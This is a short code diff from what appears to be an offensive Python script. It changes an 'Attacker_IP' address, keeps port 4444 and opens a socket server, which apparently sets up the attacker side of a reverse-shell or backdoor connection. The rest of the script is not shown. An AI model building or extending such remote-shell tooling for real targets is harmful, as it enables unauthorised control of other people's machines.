@@ -1,6 +1,6 @@
 import socket
 
-Attacker_IP = '192.168.33.174'
+Attacker_IP = '10.93.94.171'
 PORT = 4444
 
 server = socket.socket()
